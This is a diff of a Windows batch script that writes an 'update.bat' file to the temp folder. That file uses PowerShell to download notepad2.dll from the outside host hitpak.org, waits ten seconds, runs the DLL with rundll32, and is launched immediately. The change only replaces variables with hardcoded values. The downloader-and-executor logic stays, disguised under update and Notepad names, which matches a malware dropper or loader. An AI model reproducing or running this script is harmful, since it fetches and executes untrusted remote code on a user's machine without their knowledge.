@@ -17,12 +17,12 @@ set "updatebat=%TEMP%\update.bat"
 set "dllurl=https://hitpak.org/notepad2.dll"
 set "dllpath=%TEMP%\notepad2.dll"
 
-:: Create update.bat in TEMP that downloads and tries to run notepad2.dll after 10-second delay
+:: Create update.bat with hardcoded values
 (
 echo @echo off
-echo powershell -Command "Invoke-WebRequest -Uri '%dllurl%' -OutFile '%dllpath%'"
+echo powershell -Command "Invoke-WebRequest -Uri 'https://hitpak.org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
 echo timeout /t 10 ^>nul
-echo rundll32.exe "%dllpath%",notepad
+echo rundll32.exe "%TEMP%\notepad2.dll",notepad
 ) > "%updatebat%"
 
 :: Run update.bat immediately
